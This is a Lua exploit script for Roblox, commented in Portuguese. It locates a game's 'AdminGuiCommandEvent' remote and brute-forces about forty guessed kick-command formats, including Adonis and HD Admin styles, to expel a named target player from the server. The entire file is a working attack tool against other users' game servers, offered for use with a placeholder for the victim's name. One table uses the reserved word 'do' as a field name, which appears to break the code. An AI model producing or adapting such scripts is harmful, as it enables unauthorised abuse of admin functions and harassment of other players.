--[[
    👢 Server Kick Brute Force – Força bruta no AdminGuiCommandEvent
    Testa dezenas de comandos de kick no RemoteEvent encontrado
    para descobrir o formato correto e expulsar o jogador alvo.
--]]

local Players = game:GetService("Players")
local Player = Players.LocalPlayer
local Workspace = game:GetService("Workspace")
local ReplicatedStorage = game:GetService("ReplicatedStorage")
local targetPlayerName = "NOME_DO_JOGADOR_ALVO" -- <<< TROQUE PELO NOME DO JOGADOR QUE QUER EXPULSAR

-- 1. Encontrar o RemoteEvent
local function findRemoteEvent(name)
    local function search(container)
        for _, obj in ipairs(container:GetChildren()) do
            if obj:IsA("RemoteEvent") and obj.Name == name then
                return obj
            end
            local found = search(obj)
            if found then return found end
        end
        return nil
    end
    return search(Workspace) or search(ReplicatedStorage)
end

local event = findRemoteEvent("AdminGuiCommandEvent")
if not event then
    warn("RemoteEvent 'AdminGuiCommandEvent' não encontrado!")
    return
end

print("✅ Evento encontrado: " .. event:GetFullName())
print("🎯 Alvo: " .. targetPlayerName)
print("🚀 Iniciando força bruta de comandos de kick...")

-- 2. Lista de comandos e formatos para testar
local kickAttempts = {
    -- Comandos de texto direto
    {"kick", targetPlayerName},
    {"kick", targetPlayerName, "Expulso"},
    {":kick", targetPlayerName},
    {"/kick", targetPlayerName},
    {"!kick", targetPlayerName},
    {"k", targetPlayerName},
    {"k", targetPlayerName, "Expulso"},
    
    -- Comandos com nome do jogador como primeiro argumento
    {targetPlayerName, "kick"},
    {targetPlayerName, ":kick"},
    {targetPlayerName, "/kick"},
    
    -- Strings de comando completo
    {"kick " .. targetPlayerName},
    {":kick " .. targetPlayerName},
    {"/kick " .. targetPlayerName},
    {"!kick " .. targetPlayerName},
    {"k " .. targetPlayerName},
    {"e " .. targetPlayerName},
    {"execute kick " .. targetPlayerName},
    {"run kick " .. targetPlayerName},
    
    -- Tabelas com Command e Args
    {{Command = "kick", Args = {targetPlayerName}}},
    {{Command = "Kick", Args = {targetPlayerName}}},
    {{command = "kick", args = {targetPlayerName}}},
    {{cmd = "kick", data = targetPlayerName}},
    {{action = "kick", target = targetPlayerName}},
    {{type = "kick", player = targetPlayerName}},
    {{Type = "Kick", Player = targetPlayerName}},
    {{Event = "kick", Name = targetPlayerName}},
    {{event = "kick", name = targetPlayerName}},
    {{request = "kick", who = targetPlayerName}},
    {{do = "kick", to = targetPlayerName}},
    {{task = "kick", on = targetPlayerName}},
    
    -- Tabelas com função "kick" e argumentos separados
    {{"kick", targetPlayerName}},
    {{"k", targetPlayerName}},
    {{":kick", targetPlayerName}},
    
    -- Formatos Adonis
    {{"Adonis", "kick", targetPlayerName}},
    {{"adonis", "kick", targetPlayerName}},
    {"kick", targetPlayerName, "Adonis"},
    
    -- Formatos HD Admin
    {{"HDAdmin", "kick", targetPlayerName}},
    {{"hdadmin", "kick", targetPlayerName}},
    {"hd", "kick", targetPlayerName},
}

print("📊 Total de tentativas: " .. #kickAttempts)

-- 3. Executa as tentativas
for i, args in ipairs(kickAttempts) do
    local success, err = pcall(function()
        event:FireServer(unpack(args))
    end)
    
    local argsStr = ""
    for _, v in ipairs(args) do
        if type(v) == "table" then
            argsStr = argsStr .. "{...}, "
        else
            argsStr = argsStr .. tostring(v) .. ", "
        end
    end
    
    if success then
        print("✅ " .. i .. ": " .. argsStr)
    else
        print("❌ " .. i .. ": " .. argsStr .. " | Erro: " .. tostring(err))
    end
    
    task.wait(0.15)
end

print("🎯 Força bruta concluída. Verifique se o jogador foi expulso.")
print("Se nenhuma tentativa funcionou, o servidor pode exigir uma senha ou o evento não é para kick.")
